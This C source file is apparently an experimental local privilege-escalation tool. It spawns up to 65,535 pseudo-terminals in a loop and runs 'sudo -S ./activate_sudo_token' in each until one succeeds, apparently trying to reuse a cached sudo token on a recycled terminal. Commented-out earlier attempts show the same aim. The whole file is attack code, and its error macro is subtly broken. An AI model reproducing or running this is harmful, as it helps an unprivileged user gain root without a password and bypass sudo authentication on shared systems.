#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include <pty.h>
#include <termios.h>
#include <fcntl.h>

#include <sys/select.h>
#include <sys/wait.h>

#define SHELL "/bin/sh"

#define error(msg, ...) { fprintf(stderr, #__VA_ARGS__); exit(1); }

int main() {
	// instanciate a sudo token for this process
	// current tty
	// no tty
	// accessible tty
	// killtty ?
	// accessible tty
	int master;
	pid_t pid;
	char name[256];

	printf("start\n");
	for (size_t i = 0; i < 0xffff; i++) {
		pid = forkpty(&master, (char*)&name, NULL, NULL);
		if (pid < 0) error("ERROR: forkpty\n");
		if (pid == 0) {
			/* printf("child %d\n", getpid()); */
			/* execlp(SHELL, SHELL, "-c", "tty >> /tmp/tty", NULL); */
			/* execlp("sudo", "sudo", "-S", "ls", NULL); */
			/* system("echo | sudo -S ./activate_sudo_token >/dev/null 2>&1"); */
			close(0);
			execlp("sudo", "sudo", "-S", "./activate_sudo_token", 0);
			/* execlp("true", "true", 0); */
			exit(42);
		} else {
			printf("parent %d, child %d on %s\n", getpid(), pid, name);
			int wstatus = 0;
			waitpid(pid, &wstatus, 0);
			printf("wstatus = %d\n", wstatus);
			close(master);
			if (wstatus != 256) {
				return 0;
			}
		}
	}
	return 0;
}
/* int main() { */
/* 	int master; */
/* 	pid_t pid; */
/*  */
/* 	printf("start\n"); */
/* 	pid = forkpty(&master, NULL, NULL, NULL); */
/* 	if (pid < 0) error("ERROR: fork_pty\n"); */
/* 	if (pid == 0) { */
/* 		printf("child %d\n", getpid()); */
/* 		#<{(| execlp(SHELL, SHELL, "-c", "tty >> /tmp/tty", NULL); |)}># */
/* 		execlp("sudo", "sudo", "-S", "ls", NULL); */
/* 	} else { */
/* 		printf("parent %d, child %d\n", getpid(), pid); */
/* 		int wstatus = 0; */
/* 		waitpid(pid, &wstatus, 0); */
/* 	} */
/* 	return 0; */
